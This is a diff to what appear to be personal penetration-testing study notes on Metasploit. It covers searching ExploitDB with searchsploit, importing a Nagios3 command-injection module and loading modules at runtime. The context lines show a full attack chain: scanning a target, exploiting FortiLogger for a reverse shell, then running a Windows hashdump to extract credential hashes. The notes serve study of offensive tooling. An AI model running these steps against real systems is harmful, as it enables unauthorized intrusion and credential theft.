@@ -368,3 +368,25 @@ $sudo msfdb run >db_nmap -A --top-ports 60 -T5 <targetIP>
 <result port 5000, IIS version 10.0 is running FortiLogger, a log and reporting software
 $search FortiLogger >use 0>Set LHOST tun0 >set RHOSTS <targetIP> >exploit >shell>whoami
 $background > search hashdump >search hashdump post windows >use 3 >set SESSION 1 >run
+
+\\\\\\\\\============================================
+Writing and Importing Modules
+-search on ExploitDB EX Nagios3 > fund the exploit code Inside ExploitDB entries.
+$searchsploit
+$searchsploit Nagios3 .rb file will automatically import to msfconsole
+$searchsploit -t Nagios3 -- exclude=".py"
+/usr/share/metasploit-framework the critical folders are also symlinked in our home and root folders in the hiddent ~/.msf4/ location
+\\MSF - Directory Structure
+$ls /usr/share/metasploit-framework/
+$ls .msf4/
+.msf4 location might not have all the folder structure that /usr/share/metasploit-framework/ one might have so we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find new modules
+NOTE: Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get msfconsole to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.
+For example:
+
+nagios3_command_injection.rb
+our_module_here.rb
+\\MSF- Loading Additional Modules at Runtime
+$cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+$msfconsole -m /usr/share/metasploit-framework/modules/
+\\MSF-Loading Additional Modules
+msf>loadpath /usr/share/metasploit-framework/modules/
